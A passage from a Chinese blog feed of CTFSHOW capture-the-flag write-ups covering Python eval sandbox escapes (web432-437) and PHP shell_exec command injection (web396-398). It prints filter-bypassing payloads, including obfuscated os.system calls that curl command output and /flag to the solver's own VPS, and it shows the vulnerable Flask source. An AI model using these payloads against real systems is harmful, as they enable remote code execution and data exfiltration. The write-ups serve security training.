class="line">?code=str(__builtins__.__dict__[&#x27;__impo&#x27;%2b&#x27;rt__&#x27;](&#x27;o&#x27;%2b&#x27;s&#x27;).__getattribute__(&#x27;syste&#x27;%2b&#x27;m&#x27;)(&#x27;curl http://你的vps地址:端口?p=`cat /flag`&#x27;))</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250822164334048.png"></p><p>得到的flag没有括号，自行加个括号就可以</p><h3 id="web433"><a href="#web433" class="headerlink" title="web433"></a>web433</h3><p>直接用上题的payload会不行，经过测试发现去掉<code>builtins</code>就可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(__import__(&#x27;o&#x27;%2b&#x27;s&#x27;).__getattribute__(&#x27;syste&#x27;%2b&#x27;m&#x27;)(&#x27;curl http://你的vps地址:端口?p=`ls`&#x27;))</span><br></pre></td></tr></table></figure><p>也可以把so反转成os，<code>[::-1]</code> 是 Python 中<strong>字符串切片</strong>的写法，表示反转字符串。<code>&#39;so&#39;[::-1]</code>结果是 os</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(__import__(&#x27;so&#x27;[::-1]).__getattribute__(&#x27;syste&#x27;%2b&#x27;m&#x27;)(&#x27;curl http://你的vps地址:端口?p=`ls`&#x27;))</span><br></pre></td></tr></table></figure><p>老样子，我们看看源码，方法跟上题一样，base64带出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|builtins&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>可以看到这题把<code>builtins</code>模块禁了，我们直接<code>import</code>就可以</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(__import__(&#x27;o&#x27;%2b&#x27;s&#x27;).__getattribute__(&#x27;syste&#x27;%2b&#x27;m&#x27;)(&#x27;curl http://你的vps地址:端口?p=`cat /flag`&#x27;))</span><br></pre></td></tr></table></figure><h3 id="web434"><a href="#web434" class="headerlink" title="web434"></a>web434</h3><p>经过测试，发现这题是把curl过滤了，加个<code>&#39;%2b&#39;</code>在中间就可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(__import__(&#x27;o&#x27;%2b&#x27;s&#x27;).__getattribute__(&#x27;syste&#x27;%2b&#x27;m&#x27;)(&#x27;cu&#x27;%2b&#x27;rl http://你的vps地址:端口?p=`ls`&#x27;))</span><br></pre></td></tr></table></figure><p>我们看看源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Q2B</span>(<span class="params">uchar</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;单个字符 全角转半角&quot;&quot;&quot;</span></span><br><span class="line">    inside_code = <span class="built_in">ord</span>(uchar)</span><br><span class="line">    <span class="keyword">if</span> inside_code == <span class="number">0x3000</span>:</span><br><span class="line">        inside_code = <span class="number">0x0020</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        inside_code -= <span class="number">0xfee0</span></span><br><span class="line">    <span class="keyword">if</span> inside_code &lt; <span class="number">0x0020</span> <span class="keyword">or</span> inside_code &gt; <span class="number">0x7e</span>: <span class="comment">#转完之后不是半角字符返回原来的字符</span></span><br><span class="line">        <span class="keyword">return</span> uchar</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(inside_code)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stringQ2B</span>(<span class="params">ustring</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;把字符串全角转半角&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([Q2B(uchar) <span class="keyword">for</span> uchar <span class="keyword">in</span> ustring])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    code = stringQ2B(code)</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|builtins|curl&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>发现多了两个函数，用于将字符串中的<strong>全角字符转换为半角字符</strong>，然后后面调用 <code>stringQ2B</code> 将 <code>code</code> 中的全角字符全部转为半角，返回结果重新赋值给 <code>code</code>，对我们影响不大</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(__import__(&#x27;o&#x27;%2b&#x27;s&#x27;).__getattribute__(&#x27;syste&#x27;%2b&#x27;m&#x27;)(&#x27;cu&#x27;%2b&#x27;rl http://你的vps地址:端口?p=`cat /flag`&#x27;))</span><br></pre></td></tr></table></figure><h3 id="web435"><a href="#web435" class="headerlink" title="web435"></a>web435</h3><p>测试发现是<strong>把下划线禁了</strong>，我们可以用web433提到的<strong>字符串切片</strong>方法来反转字符串</p><p>首先构建反转代码，我们可以直接引入os，然后调用里面的system函数，原始代码：<code>import os; os.system(&quot;curl http://你的vps地址:端口?p=ls&quot;)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(&#x27;)&quot;`sl`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1])</span><br></pre></td></tr></table></figure><p>可以在网页看到原始代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250822185008504.png"></p><p>我们具体解释一下<code>[::-1]</code>代码，Python 的切片语法是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sequence[start:stop:step]</span><br></pre></td></tr></table></figure><ul><li><code>start</code> 是切片起始索引（包含该位置）</li><li><code>stop</code> 是结束索引（不包含该位置）</li><li><code>step</code> 是步长（跨越的索引间隔）</li></ul><p>其中三个参数都可以省略</p><p><code>[::-1]</code> 的含义：</p><ul><li><code>start</code> 和 <code>stop</code> 都省略，表示从序列的头到尾</li><li><code>step</code> 是 <code>-1</code> ，表示步长为-1，即<strong>反向遍历序列</strong></li></ul><p>这样会创建序列的<strong>反转副本</strong>，不改变原序列</p><p>然后我们用<code>exec</code>执行这串代码就可以</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(exec(&#x27;)&quot;`sl`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1]))</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250822185844411.png"></p><p>可以把它的源码爆出来看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(exec(&#x27;)&quot;`yp.ppa 0 w- 46esab`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1]))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Q2B</span>(<span class="params">uchar</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;单个字符 全角转半角&quot;&quot;&quot;</span></span><br><span class="line">    inside_code = <span class="built_in">ord</span>(uchar)</span><br><span class="line">    <span class="keyword">if</span> inside_code == <span class="number">0x3000</span>:</span><br><span class="line">        inside_code = <span class="number">0x0020</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        inside_code -= <span class="number">0xfee0</span></span><br><span class="line">    <span class="keyword">if</span> inside_code &lt; <span class="number">0x0020</span> <span class="keyword">or</span> inside_code &gt; <span class="number">0x7e</span>: <span class="comment">#转完之后不是半角字符返回原来的字符</span></span><br><span class="line">        <span class="keyword">return</span> uchar</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(inside_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stringQ2B</span>(<span class="params">ustring</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;把字符串全角转半角&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([Q2B(uchar) <span class="keyword">for</span> uchar <span class="keyword">in</span> ustring])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    code = stringQ2B(code)</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|builtins|curl|_&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>最后我们找flag就可以</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(exec(&#x27;)&quot;`galf/ tac`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1]))</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250822190335029.png"></p><h3 id="web436"><a href="#web436" class="headerlink" title="web436"></a>web436</h3><p>可以继续用上题的方法</p><p>我们把源码爆出来看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Q2B</span>(<span class="params">uchar</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;单个字符 全角转半角&quot;&quot;&quot;</span></span><br><span class="line">    inside_code = <span class="built_in">ord</span>(uchar)</span><br><span class="line">    <span class="keyword">if</span> inside_code == <span class="number">0x3000</span>:</span><br><span class="line">        inside_code = <span class="number">0x0020</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        inside_code -= <span class="number">0xfee0</span></span><br><span class="line">    <span class="keyword">if</span> inside_code &lt; <span class="number">0x0020</span> <span class="keyword">or</span> inside_code &gt; <span class="number">0x7e</span>: <span class="comment">#转完之后不是半角字符返回原来的字符</span></span><br><span class="line">        <span class="keyword">return</span> uchar</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(inside_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stringQ2B</span>(<span class="params">ustring</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;把字符串全角转半角&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([Q2B(uchar) <span class="keyword">for</span> uchar <span class="keyword">in</span> ustring])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    code = stringQ2B(code)</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|builtins|curl|_|getattr&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>可以看到这题把<code>getattr</code>过滤了，不过不影响我们做题，步骤跟上题一样</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(exec(&#x27;)&quot;`galf/ tac`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1]))</span><br></pre></td></tr></table></figure><h3 id="web437"><a href="#web437" class="headerlink" title="web437"></a>web437</h3><p>跟上题一样的方法</p><p>爆出源码看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Q2B</span>(<span class="params">uchar</span>):</span><br><span class="line">    inside_code = <span class="built_in">ord</span>(uchar)</span><br><span class="line">    <span class="keyword">if</span> inside_code == <span class="number">0x3000</span>:</span><br><span class="line">        inside_code = <span class="number">0x0020</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        inside_code -= <span class="number">0xfee0</span></span><br><span class="line">    <span class="keyword">if</span> inside_code &lt; <span class="number">0x0020</span> <span class="keyword">or</span> inside_code &gt; <span class="number">0x7e</span>: </span><br><span class="line">        <span class="keyword">return</span> uchar</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(inside_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stringQ2B</span>(<span class="params">ustring</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([Q2B(uchar) <span class="keyword">for</span> uchar <span class="keyword">in</span> ustring])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    code = stringQ2B(code)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;\\u&#x27;</span> <span class="keyword">in</span> code:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hacker?&#x27;</span></span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|builtins|curl|_|getattr&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>多了个<code>if &#39;\\u&#39; in code</code>，<code>\\u</code> 是一种表示 <strong>Unicode 编码字符</strong> 的转义序列</p><p><strong>具体说明：</strong></p><ul><li>在字符串里，<code>\u</code> 后面跟着 4 位十六进制数字，用来表示一个 Unicode 字符的编码</li><li>比如 <code>\u4f60</code> 表示汉字 “你”，<code>\u597d</code> 表示汉字 “好”</li><li>这种写法在很多编程语言和数据格式（如 JSON）中都用来表达非 ASCII 字符</li></ul><p>这次过滤对我们影响不大，可以继续用上题的步骤</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(exec(&#x27;)&quot;`galf/ tac`=p?反转端口:你的反转vps地址//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1]))</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">CTFSHOW 其他篇第二部分详细题解</summary>
    
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/categories/CTFSHOW/"/>
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/tags/CTFSHOW/"/>
    
    <category term="CTF练习" scheme="https://waynejoon.github.io/tags/CTF%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW | 其他篇题解（一）web396 - web416</title>
    <link href="https://waynejoon.github.io/posts/ctfshow-others-1-web396-web416/"/>
    <id>https://waynejoon.github.io/posts/ctfshow-others-1-web396-web416/</id>
    <published>2025-08-21T02:33:16.000Z</published>
    <updated>2025-08-22T12:27:37.479Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于题目比较多，所以分三个部分来写，这是第一部分</p><h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="web396"><a href="#web396" class="headerlink" title="web396"></a>web396</h3><p>打开题目，可以看到给出了代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820155259833.png"></p><p>会解析传入的URL，然后提取其中的host和path放入代码中执行</p><p>我们分析一下URL结构，举个例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.example.com:8080/path/to/resource?user=alice#section1</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">部分</th><th align="left">示例</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">scheme</td><td align="left">https</td><td align="left">协议（常见有http、https、ftp等）</td></tr><tr><td align="left">host</td><td align="left"><a href="http://www.example.com/">www.example.com</a></td><td align="left">主机地址&#x2F;域名</td></tr><tr><td align="left">port</td><td align="left">8080</td><td align="left">端口号（省略时默认http是80，https为443）</td></tr><tr><td align="left">path</td><td align="left">&#x2F;path&#x2F;to&#x2F;resource</td><td align="left">路径，资源在服务器的位置</td></tr><tr><td align="left">query</td><td align="left">?user&#x3D;alice</td><td align="left">查询参数</td></tr><tr><td align="left">fragment</td><td align="left">#section1</td><td align="left">页面锚点，供浏览器滚动到指定位置</td></tr></tbody></table><p>回到题目，<code>shell_exec</code>函数可以执行系统命令，因此有很多方法可以做这题</p><p><strong>方法一：反引号执行系统命令</strong></p><p>用反引号执行系统命令，传入参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://`ls`/var/www/html/1.txt</span><br></pre></td></tr></table></figure><p>然后打开<code>1.txt</code>查看结果</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820160928378.png"></p><p>直接读取flag即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://`cat fl0g.php`/var/www/html/1.txt</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820161023526.png"></p><p><strong>方法二：$()执行系统命令</strong></p><p>在Shell脚本或命令行里，<code>$()</code>语法可以用来执行系统命令。它的作用叫“命令替换”：会把括号里的命令先执行，然后用输出结果代替<code>$()</code>这个表达式的内容</p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://$(ls)/var/www/html/1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://$(cat fl0g.php)/var/www/html/1.txt</span><br></pre></td></tr></table></figure><p><strong>方法三：分号截断命令</strong></p><p>可以用分号截断当前命令，然后执行新命令，可以直接写文件、写webshell，或者反弹shell都可以，看你喜欢哪个</p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://1/1;echo `ls` &gt; 1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://1/1;echo `cat fl0g.php` &gt; 1.txt</span><br></pre></td></tr></table></figure><h3 id="web397"><a href="#web397" class="headerlink" title="web397"></a>web397</h3><p>这次把内容写进了<code>/tmp</code>目录里</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820162308362.png"></p><p>因为<code>/tmp</code>是在根目录，用<code>../</code>返回上一级即可，方法跟之前一样</p><p><strong>方法一：反引号执行系统命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://`ls`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820162629249.png"></p><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://`cat fl0g.php`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250820162552339.png"></p><p><strong>方法二：$()执行系统命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://$(ls)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://$(cat fl0g.php)/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p><strong>方法三：分号截断命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://1/1;echo `ls` &gt; 1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://1/1;echo `cat fl0g.php` &gt; 1.txt</span><br></pre></td></tr></table></figure><h3 id="web398"><a href="#web398" class="headerlink" title="web398"></a>web398</h3><p>对host部分<strong>过滤了分号</strong>，方法三用不了，其他步骤跟web397一样</p><p><img src="https://oss.waynejoons.icu/picphoto/20250820162951438.png"></p><p><strong>方法一：反引号执行系统命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://`ls`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://`cat fl0g.php`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure><p><strong>方法二：$()执行系统命令</strong></p><p>读取当前目录内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 